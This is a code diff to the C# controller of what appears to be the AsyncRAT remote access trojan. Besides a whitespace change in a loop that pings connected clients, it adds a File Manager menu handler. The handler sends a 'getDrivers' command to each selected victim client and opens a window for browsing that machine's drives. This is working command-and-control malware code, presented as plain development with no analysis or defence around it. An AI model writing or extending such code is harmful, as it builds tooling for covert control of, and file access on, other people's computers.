@@ -123,7 +123,7 @@ namespace AsyncRAT_Sharp
                 msgpack.ForcePathObject("Message").AsString = "This is a ping!";
                 foreach (Clients CL in Settings.Online.ToList())
                 {
-                  await Task.Run(() =>
+                    await Task.Run(() =>
                     {
                         CL.BeginSend(msgpack.Encode2Bytes());
                     });
@@ -372,6 +372,43 @@ namespace AsyncRAT_Sharp
         private void bUILDERToolStripMenuItem_Click(object sender, EventArgs e)
         {
             builder.ShowDialog();
+        }
+
+        private void fILEMANAGERToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                if (listView1.SelectedItems.Count > 0)
+                {
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "fileManager";
+                    msgpack.ForcePathObject("Command").AsString = "getDrivers";
+                    foreach (ListViewItem C in listView1.SelectedItems)
+                    {
+                        Clients CL = (Clients)C.Tag;
+                        ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
+                        this.BeginInvoke((MethodInvoker)(() =>
+                        {
+                            FileManager FM = (FileManager)Application.OpenForms["fileManager:" + CL.ID];
+                            if (FM == null)
+                            {
+                                FM = new FileManager
+                                {
+                                    Name = "fileManager:" + CL.ID,
+                                    Text = "fileManager:" + CL.ID,
+                                    F = this,
+                                    C = CL
+                                };
+                                FM.Show();
+                            }
+                        }));
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+            }
         }
     }
 }
